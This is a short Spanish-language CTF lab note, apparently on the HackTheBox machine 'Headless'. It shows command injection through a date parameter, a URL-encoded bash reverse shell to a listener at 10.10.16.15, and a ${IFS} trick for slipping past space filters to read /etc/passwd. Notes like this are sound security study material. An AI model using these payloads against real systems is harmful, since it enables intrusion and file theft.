#commandinjection

------

![[Headless11.png]]
Vemos que si ponemos un ;date nos va a ejecutar el comando que le pongamos ya que nos tira el output de [[id]]


Ahora en el parametro *date* vamos a probar mandarnos una [[Reverse shell]] mientras estamos en escucha con [[nc -nlvp 443]]

vamos a agregar ``;bash -c "bash -i >%26 /dev/tcp/10.10.16.15/443 0>%261"``

![[Headless12.png]]

![[Headless13.png]]
Y ganamos acceso a la maquina

----

# Como inyectar espacios cuando no nos deja ponerlos

*${IFS}* lo interpreta como si fuera un espacio, pero no es un espacio literalmente
Por ejemplo si quisieramos hacer un ``;cat /etc/passwd`` no podriamos por que tiene espacio, pero si ponemos `;cat${IFS}/etc/passwd;#` se ejecutaria el comando correctamente